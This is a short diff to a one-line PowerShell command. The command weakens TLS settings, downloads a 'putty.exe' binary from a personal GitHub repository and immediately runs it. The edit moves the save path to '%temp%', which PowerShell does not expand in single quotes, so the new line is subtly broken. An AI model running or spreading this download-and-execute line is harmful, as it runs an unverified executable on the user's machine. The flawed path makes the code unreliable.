@@ -1,1 +1,1 @@
-[system.net.ServicePointManager]::Securityprotocol = @("Tls12","Tls11","Tls","Ssl3");(New-Object System.Net.WebClient).DownloadFile('https://github.com/rleekc/Powershell-Scripts/raw/master/putty.exe','C:\Users\Public\putty.exe');Start-Process 'C:\Users\Public\putty.exe'
+[system.net.ServicePointManager]::Securityprotocol = @("Tls12","Tls11","Tls","Ssl3");(New-Object System.Net.WebClient).DownloadFile('https://github.com/rleekc/Powershell-Scripts/raw/master/putty.exe','%temp%\putty.exe');Start-Process '%temp%\putty.exe'
